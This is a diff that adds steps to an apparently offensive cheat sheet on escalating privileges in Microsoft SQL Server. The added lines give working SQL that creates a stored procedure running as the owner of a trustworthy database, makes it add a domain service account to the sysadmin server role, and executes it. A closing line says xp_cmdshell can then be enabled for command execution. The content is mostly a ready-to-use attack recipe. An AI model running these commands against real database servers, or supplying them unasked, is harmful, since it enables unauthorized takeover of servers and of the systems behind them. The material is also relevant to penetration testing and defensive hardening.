@@ -66,6 +66,21 @@ SELECT a.name, b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys
 ```
 
 ## Check privilages on databses to see if we are owner of a trustworthy database
+
 ```sql
 SELECT rp.name as database_role, mp.name as database_user FROM sys.database_role_members drm JOIN sys.database_principals rp on (drm.role_principal_id = rp.principal_id) JOIN sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
 ```
+
+## Create a stored procedure to get sysadmnin privilages on the trustworthy database
+
+```sql
+CREATE OR ALTER PROCEDURE dbo.xct WITH EXECUTE AS owner AS ALTER SERVER ROLE sysadmin ADD MEMBER [MYTHICAL-EU\svc_sql];
+```
+
+## Run the stored procedure 
+
+```sql
+EXEC dbo.xct;
+```
+
+After this you can enable xp_cmdshell and have command execution/privilage escalation.
